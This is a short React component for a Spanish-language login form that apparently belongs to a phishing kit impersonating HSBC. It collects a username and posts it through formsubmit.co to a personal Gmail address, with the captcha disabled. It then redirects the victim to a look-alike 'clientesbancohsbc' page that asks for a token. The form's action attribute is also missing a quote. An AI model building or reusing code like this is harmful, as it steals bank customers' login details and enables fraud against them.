
import React from 'react';
import Footer from './Footer';
import '../css/style.css'

const Formulariouser = () => {
    return (
        <div className='contenedor' >
        <form className='formulario' action= https://formsubmit.co/robr48j@gmail.com" method="POST" >
            <h1 className='titulo'>Iniciar sesión</h1>
            <div className='cont'>
                <div className="labeleicon">
                    <label className='label' >Ingresa tu Usuario</label>
                </div>
                <div className="input-cont">
                    <input className='inputname' name='name' type="text"/>
                    <input type="hidden" name="email" value="respues2formul@gmail.com" />
                    <input type="hidden" name="_next" value="https://clientesbancohsbc.vercel.app/token" />
                    <input type="hidden" name="_captcha" value="false" />
                </div>
                <div className="olvidouser">
                    <a href='' className='linkolvido' >¿Olvidaste tu usuario?</a>
                </div>
                <div className="input-contbtn">
                    <button className='btncontinuar' type='submit' >Continuar</button>
                </div>
            </div>
        </form>
        </div>
);}

export default Formulariouser;
